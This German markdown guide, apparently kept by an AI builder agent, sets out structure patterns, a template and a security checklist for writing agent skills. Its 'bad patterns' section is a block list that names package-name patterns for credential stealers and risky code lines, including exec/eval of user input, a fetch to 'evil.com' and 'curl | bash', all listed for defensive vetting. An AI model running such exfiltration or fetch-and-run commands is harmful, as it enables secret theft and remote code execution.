# Skill Patterns — EmpireHazeClaw Builder
*Zuletzt aktualisiert: 2026-04-09*

---

## 📊 Analyse vorhandener Skills

**Skills gefunden:**
| Skill | Workspace | Typ | Status |
|-------|-----------|-----|--------|
| `memory-maintain` | /skills/ | Maintenance | ✅ aktiv |
| `security-hardening` | /skills/ | Security | ✅ aktiv |
| `security` (Folder) | /skills/security/ | Security | ✅ aktiv |
| `system-health-check` | /skills/ | Monitoring | ✅ aktiv |
| `voice-processing` | /skills/ | Audio | ✅ aktiv |

---

## ✅ GUTE PATTERNS

### 1. **Konsistente Struktur**
```
# Skill: [NAME]

## Beschreibung
[Kurze, präzise Beschreibung was der Skill macht]

## Workflow
1. [Schritt 1]
2. [Schritt 2]
3. [Schritt 3]

## Output
- [Was der Skill zurückgibt]
- [Format: Report/Liste/Datei/etc.]
```

### 2. **Effektive Skill-Merkmale**

| Merkmal | Beispiel | Warum wichtig |
|---------|----------|---------------|
| **Zeitschätzung** | "unter 30 Sekunden" | Erwartungsmanagement |
| **Nummerierte Steps** | 1. 2. 3. | Klare Reihenfolge |
| **Output-Definition** | "Health-Status: ✅/⚠️/❌" | Verarbeitung klar |
| **Spezifische Tools** | `python3 script.py` | Reproduzierbar |
| **Workspace-Scopes** | security/, builder/ | Sicherheit |
| **Deutsche Beschreibung** | "Führt Security-Audit durch" | Konsistenz |

### 3. **Skill-Subfolders (Complex Skills)**
```
skills/[name]/
├── SKILL.md              ← Hauptdokumentation
├── scripts/              ← Ausführbare Scripts
│   ├── run_scan.sh
│   └── helper.py
└── docs/
    └── extended_info.md   ← Zusatzinfos
```

### 4. **Trigger-basierte Skills**
- Skills die auf bestimmte Events reagieren
- z.B. "bei Security-Review anfragen"
- Cleare Input/Output Contracts

---

## ❌ BAD PATTERNS

### 1. **Suspicious Package Names**
```
BLOCK:
- *stealer*     → Env/API Key Diebstahl
- *grab*         → Data exfiltration  
- *exec*         → Code execution
- *inject*       → Injection attacks
- unknown-publisher/*
- unofficial-*
- clonemarket-*
```

### 2. **Riskante Code-Patterns**
```python
# BLOCK — Env theft
os.environ.get("API_KEY")
process.env("SECRET")
dotenv.config()  # ohne Vetting

# BLOCK — Exec injection  
exec(user_input)
eval(user_input)
subprocess(shell=True)

# BLOCK — Data exfil
fetch("http://evil.com")
requests.get(user_url)
curl | bash
```

### 3. **Fehlende Strukturen**
- Keine Beschreibung = unbrauchbar
- Kein Workflow = keine Reproduzierbarkeit
- Kein Output = kein Erfolgsnachweis
- Unscoped Workspaces = Sicherheitsrisiko

---

## 📋 SKILL TEMPLATE

```markdown
# Skill: [NAME]

## Beschreibung
[1-2 Sätze was dieser Skill macht]

## Workflow
1. [Erster Schritt mit spezifischem Command]
2. [Zweiter Schritt]
3. [Dritter Schritt]

## Output
- [Format: Report/JSON/Liste/etc.]
- [Beispiel wenn sinnvoll]

## Time Estimate
[z.B. "unter 30 Sekunden" oder "2-5 Minuten"]

## Workspace Scope
[z.B. "/workspace/security" oder "/workspace/data"]

## Tags
[z.B. "security", "monitoring", "automation"]
```

---

## 🏷️ HÄUFIGE TAGS/KATEGORIEN

| Kategorie | Tags | Agent |
|-----------|------|-------|
| Security | `security`, `audit`, `scan`, `hardening` | Security Officer |
| Monitoring | `health`, `monitor`, `watchdog`, `heartbeat` | Alle |
| Maintenance | `cleanup`, `backup`, `archive`, `memory` | Data Manager |
| Automation | `cron`, `scheduled`, `automated` | Builder |
| Communication | `discord`, `telegram`, `report` | CEO |
| Research | `web-search`, `data-extraction`, `facts` | Research |

---

## 🔍 AUTO-GENERATION CHECKLISTE

Bei automatischer Skill-Generierung prüfen:

### ✅ MUSS (Must-Have)
- [ ] Name ist aussagekräftig und eindeutig
- [ ] Beschreibung in 1-2 Sätzen
- [ ] Nummerierte Workflow-Steps
- [ ] Output definiert
- [ ] Workspace-Scope limitiert

### ⚠️ SOLLTE (Should-Have)
- [ ] Time Estimate
- [ ] Benötigte Tools/Scripte referenziert
- [ ] Tags für Kategorisierung
- [ ] Fehlerbehandlung erwähnt

### 🔒 SICHERHEITS-CHECK
- [ ] Keine exec() mit user input
- [ ] Keine env/read ohne Vetting
- [ ] Nur Verifizierte Origins
- [ ] Scoped auf eigenen Workspace
- [ ] Keine Netzwerk-Exfiltration

---

## 📁 OUTPUT

Diese Dokumentation wird genutzt für:
- Automatische Skill-Generierung durch Builder Agent
- Qualitätsprüfung neuer Skills
- Security Vetting (siehe `security/skill_vetting_rules.md`)

---

*Builder Agent — EmpireHazeClaw*
*Erstellt: 2026-04-09*